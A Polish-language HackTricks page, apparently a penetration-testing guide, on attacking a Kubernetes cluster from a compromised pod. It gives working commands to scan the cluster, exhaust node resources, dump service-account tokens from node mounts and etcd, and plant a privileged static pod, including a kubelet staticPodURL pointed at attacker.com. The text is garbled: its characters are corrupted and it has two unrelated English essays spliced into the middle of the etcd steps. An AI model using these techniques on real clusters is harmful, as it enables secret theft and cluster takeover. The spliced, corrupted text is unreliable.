# Atakowanie Kubernetesa od wewntrz Pojemnika

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>

## **Ucieczka z Pojemnika**

**Jeli masz szczcie, mo偶esz pr贸bowa uciec z niego do wza:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Ucieczka z pojemnika

Aby spr贸bowa uciec z pojemnik贸w, mo偶esz najpierw potrzebowa **eskaluowa uprawnienia**, oto kilka technik, jak to zrobi:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Mo偶esz sprawdzi te **przejcia dockerowe, aby spr贸bowa uciec** z pojemnika, kt贸ry zosta skompromitowany:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Nadu偶ywanie Uprawnie Kubernetesa

Jak wyjaniono w sekcji dotyczcej **enumeracji kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Zazwyczaj pojemniki s uruchamiane z **tokenem konta usugi** wewntrz nich. To konto usugi mo偶e mie przypisane pewne **uprawnienia**, kt贸rych mo偶esz **nadu偶y**, aby **przenie** si do innych pojemnik贸w lub nawet **uciec** do skonfigurowanych w klastrze wz贸w. Sprawd藕 jak to zrobi:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Nadu偶ywanie Uprawnie Chmurowych

Jeli pojemnik jest uruchamiany wewntrz **rodowiska chmurowego**, mo偶esz by w stanie **wyciec token z punktu kocowego metadanych** i eskalowa uprawnienia, korzystajc z niego.

## Wyszukiwanie podatnych usug sieciowych

Jako 偶e jeste w rodowisku Kubernetesa, jeli nie mo偶esz eskalowa uprawnie nadu偶ywajc obecnych uprawnie pojemnik贸w i nie mo偶esz uciec z kontenera, powiniene **szuka potencjalnie podatnych usug.**

### Usugi

**W tym celu mo偶esz spr贸bowa uzyska wszystkie usugi rodowiska kubernetes:**
```
kubectl get svc --all-namespaces
```
Domylnie Kubernetes u偶ywa paskiego schematu sieciowego, co oznacza, 偶e **ka偶dy pod/usuga w klastrze mo偶e rozmawia z innymi**. **Przestrzenie nazw** w klastrze **nie maj domylnie 偶adnych ogranicze zwizanych z bezpieczestwem sieciowym**. Ka偶dy w przestrzeni nazw mo偶e rozmawia z innymi przestrzeniami nazw.

### Skanowanie

Nastpujcy skrypt Bash (pochodzcy z [warsztat贸w Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) zainstaluje i zeskanuje zakresy IP klastra Kubernetes:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Sprawd藕 nastpujc stron, aby dowiedzie si, jak mo偶esz **atakowa konkretne usugi Kubernetes** w celu **skompromitowania innych modu贸w/wszystkiego w rodowisku**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### Podsuchiwanie

W przypadku, gdy **skompromitowany pod uruchamia wra偶liw usug**, do kt贸rej inne moduy musz uwierzytelnia, mo偶esz uzyska dane uwierzytelniajce wysyane z innych modu贸w, **przechwytujc lokalne komunikacje**.

## Podrobienie sieci

Domylnie techniki takie jak **podrobienie ARP** (i dziki temu **podrobienie DNS**) dziaaj w sieci kubernetes. Nastpnie, wewntrz moduu, jeli masz **zdolno NET\_RAW** (kt贸ra jest domylnie dostpna), bdziesz m贸g wysya specjalnie spreparowane pakiety sieciowe i przeprowadza **ataki typu MitM poprzez podrobienie ARP do wszystkich modu贸w dziaajcych na tym samym w藕le.**\
Co wicej, jeli **zoliwy pod** dziaa na **tym samym w藕le co serwer DNS**, bdziesz m贸g przeprowadzi **atak podrobienia DNS na wszystkie moduy w klastrze**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## DoS wza

W manifestach Kubernetes nie ma okrelenia zasob贸w i **nie s stosowane limity** dla kontener贸w. Jako atakujcy, mo偶emy **zu偶y wszystkie zasoby, na kt贸rych dziaa pod/wdro偶enie** i wyczerpa inne zasoby, powodujc DoS dla rodowiska.

Mo偶na to zrobi za pomoc narzdzia takiego jak [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Mo偶esz zobaczy r贸偶nic podczas uruchamiania `stress-ng` i po.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Post-Eksploatacja Wza

Jeli udao ci si **uciec z kontenera**, znajdziesz kilka interesujcych rzeczy w w藕le:

* Proces **Kontener Runtime** (Docker)
* Wicej **pods/kontener贸w** dziaajcych w w藕le, kt贸rych mo偶na nadu偶y (wicej token贸w)
* Cay **system plik贸w** i **system operacyjny** og贸lnie
* Usuga **Kube-Proxy** nasuchujca
* Usuga **Kubelet** nasuchujca. Sprawd藕 pliki konfiguracyjne:
  * Katalog: `/var/lib/kubelet/`
  * `/var/lib/kubelet/kubeconfig`
  * `/var/lib/kubelet/kubelet.conf`
  * `/var/lib/kubelet/config.yaml`
  * `/var/lib/kubelet/kubeadm-flags.env`
  * `/etc/kubernetes/kubelet-kubeconfig`
* Inne **wsp贸lne pliki kubernetes**:
  * `$HOME/.kube/config` - **Konfiguracja U偶ytkownika**
  * `/etc/kubernetes/kubelet.conf`- **Zwyka Konfiguracja**
  * `/etc/kubernetes/bootstrap-kubelet.conf` - **Konfiguracja Bootstrap**
  * `/etc/kubernetes/manifests/etcd.yaml` - **Konfiguracja etcd**
  * `/etc/kubernetes/pki` - **Klucz Kubernetes**

### Znajd藕 kubeconfig wza

Jeli nie mo偶esz znale藕 pliku kubeconfig w jednej z wczeniej skomentowanych cie偶ek, **sprawd藕 argument `--kubeconfig` procesu kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Ukradnij sekrety
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Skrypt [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) automatycznie **pobierze tokeny innych modu贸w i sprawdzi, czy maj uprawnienie**, kt贸rego szukasz (zamiast sprawdzania po kolei):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Przywilejowane DaemonSety

DaemonSet to **pod**, kt贸ry bdzie **uruchamiany** na **wszystkich wzach klastra**. Dlatego jeli DaemonSet jest skonfigurowany z **uprzywilejowanym kontem usugi**, na **WSZYSTKICH wzach** bdziesz m贸g znale藕 **token** tego **uprzywilejowanego konta usugi**, kt贸ry m贸gby wykorzysta.

Wykorzystanie jest takie samo jak w poprzednim rozdziale, ale teraz nie zale偶y to ju偶 od szczcia.

### Przejcie do Chmury

Jeli klaster jest zarzdzany przez usug chmurow, zazwyczaj **Wze bdzie mia inny dostp do punktu kocowego metadanych** ni偶 Pod. Dlatego spr贸buj **uzyska dostp do punktu kocowego metadanych z wza** (lub z pod z hostNetwork ustawionym na True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Ukradnij etcd

Jeli mo偶esz okreli [**nazwWza**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) Wza, na kt贸rym zostanie uruchomiony kontener, uzyskaj powok wewntrz wza paszczyzny kontrolnej i zdobd藕 **baz danych etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Wzy paszczyzny kontrolnej maj **rol master** i w **zarzdzanych klastrach w chmurze nie bdzie mo偶na uruchomi na nich niczego**.

#### Odczytaj tajemnice z etcd

Jeli mo偶esz uruchomi sw贸j pod na w藕le paszczyzny kontrolnej, u偶ywajc selektora `nodeName` w specyfikacji poda, mo偶esz atwo uzyska dostp do bazy danych `etcd`, kt贸ra zawiera ca konfiguracj klastra, w tym wszystkie tajemnice.

Poni偶ej znajduje si szybki i brudny spos贸b pobrania tajemnic z `etcd`, jeli dziaa on na w藕le paszczyzny kontrolnej, na kt贸rym si znajdujesz. Jeli chcesz bardziej eleganckie rozwizanie, kt贸re uruchamia poda z narzdziem klienta `etcd` o nazwie `etcdctl` i u偶ywa powiadcze wza paszczyzny kontrolnej do poczenia si z `etcd`, gdziekolwiek jest uruchomiony, sprawd藕 [ten przykadowy manifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) od @mauilion.

**Sprawd藕, czy `etcd` dziaa na w藕le paszczyzny kontrolnej i zobacz, gdzie znajduje si baza danych (To jest na klastrze utworzonym za pomoc `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a pod within a Kubernetes cluster, there are several techniques that can be used to escalate privileges and potentially take control of the entire cluster. This section outlines some common attack vectors and best practices to secure your Kubernetes environment.

### Pod Security Context

Pods in Kubernetes run with a set of security parameters defined in the PodSecurityContext. Attackers can try to escalate privileges by modifying these parameters. For example, an attacker could try to run a pod as a privileged user or gain access to the host network.

### Service Account Tokens

Service account tokens are used by pods to authenticate with the Kubernetes API server. If an attacker gains access to a pod's service account token, they can potentially interact with the Kubernetes API server and perform malicious actions.

### Kubernetes API Access

If an attacker gains access to the Kubernetes API from inside a pod, they can perform a variety of actions, such as creating or deleting resources, deploying new pods, or even taking control of the entire cluster.

### Network Policies

Properly configured network policies can help prevent lateral movement within a Kubernetes cluster. Attackers may try to exploit misconfigured network policies to gain access to sensitive resources or perform reconnaissance within the cluster.

### Best Practices

- Regularly review and update pod security context settings.
- Limit the use of privileged pods and service account permissions.
- Rotate service account tokens regularly.
- Implement network policies to restrict pod-to-pod communication.
- Monitor pod activities and API server interactions for any suspicious behavior.

By following these best practices and staying informed about the latest Kubernetes security threats, you can better protect your Kubernetes clusters from internal attacks.
```
```bash
data-dir=/var/lib/etcd
```
**Wywietl dane w bazie danych etcd:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Wyodrbnij tokeny z bazy danych i poka偶 nazw konta usugi**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**To samo polecenie, ale dodane kilka greps贸w, aby zwr贸ci tylko domylny token w przestrzeni nazw kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they can leverage this access to perform various malicious activities within the cluster. This section explores some common techniques that attackers can use to escalate privileges and move laterally within the Kubernetes environment.

### Privilege Escalation

#### Exploiting Misconfigured RBAC Roles

Attackers can abuse misconfigured Role-Based Access Control (RBAC) roles to escalate their privileges within the cluster. By assigning themselves higher privileges than intended, attackers can gain access to resources and perform actions they are not supposed to.

#### Accessing the Kubernetes API Server

Once inside a pod, attackers can attempt to access the Kubernetes API server using tools like `kubectl` or by directly interacting with the API server endpoints. This access can allow them to gather sensitive information, modify resources, or even take control of the cluster.

### Lateral Movement

#### Pod Hopping

Attackers can move laterally within the cluster by compromising one pod and then using it as a stepping stone to access other pods. This technique, known as pod hopping, allows attackers to expand their reach and potentially compromise more critical components of the cluster.

#### Service Account Compromise

By compromising a pod's service account, attackers can abuse the permissions associated with that account to access other resources within the cluster. This can enable them to move laterally and escalate privileges further, potentially leading to a full cluster compromise.

### Conclusion

Securing Kubernetes clusters requires not only protecting the external attack surface but also considering the threats that can originate from within the cluster. By understanding common attack techniques like privilege escalation and lateral movement, organizations can better defend their Kubernetes environments against malicious actors.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Statyczna / Lustrzana Trwao Pod贸w

_Pody statyczne_ s zarzdzane bezporednio przez demona kubelet na okrelonym w藕le, bez obserwowania ich przez serwer API. W przeciwiestwie do Pod贸w zarzdzanych przez paszczyzn kontroln (na przykad Deployment); zamiast tego, **kubelet obserwuje ka偶dy statyczny Pod** (i restartuje go w przypadku awarii).

Dlatego pody statyczne zawsze s **powizane z jednym Kubeletem** na okrelonym w藕le.

**Kubelet automatycznie pr贸buje utworzy lustrzany Pod na serwerze API Kubernetes** dla ka偶dego statycznego Poda. Oznacza to, 偶e Pody uruchomione na w藕le s widoczne na serwerze API, ale nie mo偶na nimi sterowa stamtd. Nazwy Pod贸w bd z sufiksem z nazw hosta wza poprzedzon mylnikiem.

{% hint style="danger" %}
**`Spec` statycznego Poda nie mo偶e odnosi si do innych obiekt贸w API** (np. ServiceAccount, ConfigMap, Secret, itp. Dlatego **nie mo偶na nadu偶y tego zachowania, aby uruchomi pod z dowolnym serviceAccount** w bie偶cym w藕le w celu skompromitowania klastra. Ale mo偶na u偶y tego do uruchamiania pod贸w w r贸偶nych przestrzeniach nazw (jeli jest to przydatne z jakiego powodu).
{% endhint %}

Jeli jeste wewntrz hosta wza, mo偶esz sprawi, 偶e **utworzy on statyczny pod wewntrz siebie**. Jest to do przydatne, poniewa偶 mo偶e pozwoli Ci **utworzy pod w innej przestrzeni nazw** jak **kube-system**.

Aby utworzy statyczny pod, [**dokumentacja jest wielk pomoc**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). W zasadzie potrzebujesz 2 rzeczy:

* Skonfiguruj parametr **`--pod-manifest-path=/etc/kubernetes/manifests`** w **usudze kubelet**, lub w **konfiguracji kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) i zrestartuj usug
* Utw贸rz definicj w **definicji poda** w **`/etc/kubernetes/manifests`**

**Innym bardziej skrytym sposobem byoby:**

* Zmodyfikuj parametr **`staticPodURL`** w pliku konfiguracyjnym **kubelet** i ustaw co w rodzaju `staticPodURL: http://attacker.com:8765/pod.yaml`. Spowoduje to, 偶e proces kubeletu utworzy **statyczny pod**, pobierajc **konfiguracj z podanego adresu URL**.

**Przykad** konfiguracji **poda** do utworzenia poda z uprawnieniami w **kube-system** zaczerpnity z [**tutaj**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Usuwanie modu贸w + wzy nieskalowalne

Jeli atakujcy **skompromituje wze** i bdzie m贸g **usun moduy** z innych wz贸w oraz sprawi, 偶e inne wzy nie bd w stanie wykonywa modu贸w, moduy zostan uruchomione ponownie na skompromitowanym w藕le, co umo偶liwi mu **ukradzenie token贸w** uruchamianych w nich.\
Aby uzyska [**wicej informacji, kliknij ten link**](nadu偶ywanie-r贸l-clusterroles-w-kubernetes/#usuwanie-modu贸w-+-wzy-nieskalowalne).

## Automatyczne narzdzia

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
